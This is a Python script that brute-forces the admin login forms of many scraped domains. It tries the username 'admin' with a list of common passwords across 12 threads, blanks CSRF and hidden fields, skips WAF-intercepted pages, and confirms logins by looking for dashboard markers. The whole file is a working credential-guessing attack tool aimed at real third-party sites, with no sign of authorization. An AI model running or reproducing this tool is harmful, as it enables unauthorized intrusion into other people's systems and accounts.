#!/usr/bin/env python3
"""form_brute2.py - STRICT generic login form brute for real admin candidates
Fixes form_brute false positives (16 hits all FALSE):
  L1: login page must have REAL user+pass form (password input + form action)
  L2: POST must redirect to non-login path OR response has admin markers + no login form
  L3: re-GET admin path with session -> dashboard markers, no password input
Input: /tmp/ra7_new_paths.txt (domain\tpath\tstatus:len)
"""
import urllib.request, urllib.parse, re, http.cookiejar
from concurrent.futures import ThreadPoolExecutor, as_completed

OUT = "/tmp/form_brute2_hits.txt"
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
LOCK_ = __import__("threading").Lock()
PWS = ["admin123", "123456", "admin", "admin888", "12345678", "666888", "admin@123",
       "a123456", "admin123456", "123456789", "admin666", "888888", "000000", "123123",
       "admin2023", "admin2024", "admin2025", "Aa123456", "abc123456", "admin@2023",
       "123456a", "a123456789", "admin111", "123321", "5201314", "admin520", "qwer1234",
       "password", "1234567890", "admin1234", "1q2w3e4r", "pass123", "test123", "admin!@#",
       "admin2020", "admin2021", "admin2022", "12345", "654321", "qwerty", "abc123",
       "admin@123456", "admin888888", "13800138000", "admin666666", "woaini1314", "a123123"]

def get_opener():
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

def fetch(op, url, timeout=10, data=None):
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None,
                                     headers={**UA, "Content-Type": "application/x-www-form-urlencoded"})
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, (e.geturl() if hasattr(e, "geturl") else url), e.read().decode("utf-8", "ignore")
    except Exception:
        return 0, url, ""

def log(s):
    with LOCK_:
        open(OUT, "a").write(s + "\n")

def find_form(body, base_url):
    """return (action, fields dict, user_field, pass_field) or None"""
    m = re.search(r"<form[^>]*action=[\"']([^\"']*)[\"'][^>]*>", body, re.I)
    if not m:
        return None
    action = m.group(1)
    if not action.startswith("http"):
        action = urllib.parse.urljoin(base_url, action)
    fields = {}
    for fm in re.finditer(r"<input[^>]*name=[\"']([^\"']+)[\"'][^>]*>", body, re.I):
        tag = fm.group(0)
        ft = re.search(r"type=[\"']([^\"']+)[\"']", tag, re.I)
        fields[fm.group(1)] = ft.group(1).lower() if ft else "text"
    uf, pf = None, None
    for n, t in fields.items():
        nl = n.lower()
        if pf is None and ("pass" in nl or "pwd" in nl or t == "password"):
            pf = n
        elif uf is None and ("user" in nl or "login" in nl or "name" in nl or "account" in nl or "admin" in nl):
            uf = n
    if not pf or not uf:
        return None
    return action, fields, uf, pf

def check(domain, path):
    op = get_opener()
    url = "http://%s%s" % (domain, path)
    code, final, body = fetch(op, url)
    if code != 200 or not body:
        return
    # skip WAF/catch-all: page must contain password input
    form = find_form(body, url)
    if not form:
        return
    action, fields, uf, pf = form
    # WAF interceptor
    if "stopinfo" in action or "stopinfo" in final:
        return
    login_size = len(body)
    for pw in PWS:
        payload = {}
        for n, t in fields.items():
            nl = n.lower()
            if n == uf:
                payload[n] = "admin"
            elif n == pf:
                payload[n] = pw
            elif t == "hidden" or any(k in nl for k in ["token", "csrf", "check", "code", "validate", "submit"]):
                payload[n] = ""
        try:
            op2 = get_opener()
            code2, final2, resp = fetch(op2, action, data=urllib.parse.urlencode(payload))
        except Exception:
            continue
        if "stopinfo" in final2 or "stopinfo" in resp:
            time.sleep(30) if False else None
            continue
        # L2: redirect to non-login path?
        if final2 != url and not re.search(r"login|signin|logon", final2, re.I):
            # L3: re-GET original with session, check admin markers
            code3, final3, body3 = fetch(op2, url)
            if "type=\"password\"" in body3.lower():
                continue  # still login
            markers = ["dashboard", "仪表盘", "logout", "退出", "欢迎", "welcome", "管理首页",
                       "主菜单", "系统管理", "frame", "frameset", "admin/index", "index.php?m=admin"]
            if any(k in body3.lower() for k in markers):
                log("!!! FORM2 %s %s admin/%s -> %s [redirect+marker]" % (domain, path, pw, final2))
                print("!!! FORM2 HIT %s admin/%s [redirect+marker]" % (domain, pw), flush=True)
                return
        # L2b: response differs + has admin markers (no login form)
        rl = resp.lower()
        if len(resp) > 0 and len(resp) != login_size and "type=\"password\"" not in rl[:2000]:
            if any(k in rl for k in ["dashboard", "logout", "退出", "欢迎", "welcome", "管理首页", "frame"]):
                log("!!! FORM2 %s %s admin/%s [body-mark]" % (domain, path, pw))
                print("!!! FORM2 HIT %s admin/%s [body-mark]" % (domain, pw), flush=True)
                return
    print("  done %s %s" % (domain, path), flush=True)

def main():
    targets = []
    seen = set()
    for line in open("/tmp/ra7_new_paths.txt"):
        parts = line.rstrip("\n").split("\t")
        if len(parts) >= 2:
            d, p = parts[0], parts[1]
            key = (d, p)
            if key not in seen:
                seen.add(key)
                targets.append((d, p))
    print("form_brute2: %d targets" % len(targets), flush=True)
    with ThreadPoolExecutor(max_workers=12) as ex:
        futs = {ex.submit(check, d, p): (d, p) for d, p in targets}
        for fut in as_completed(futs):
            fut.result()
    print("[form_brute2 done]", flush=True)

if __name__ == "__main__":
    main()
